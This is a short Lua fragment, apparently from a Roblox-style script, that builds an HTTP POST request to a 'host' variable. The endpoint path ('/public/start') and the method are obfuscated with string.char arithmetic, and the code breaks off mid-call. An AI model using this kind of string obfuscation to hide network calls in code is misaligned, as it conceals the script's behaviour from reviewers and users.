        local response, err = safeRequest({
            Url = host .. string.char((5*8+7),(5*3+97),(8*6+69),(9*2+80),(9*4+72),(9*7+42),(8*9+27),(7*5+12),(4*5+95),(4*7+88),(2*2+93),(4*8+82),(9*2+98)),
            Method = string.char((9*2+62),(4*8+47),(6*8+35),(4*4+68)),
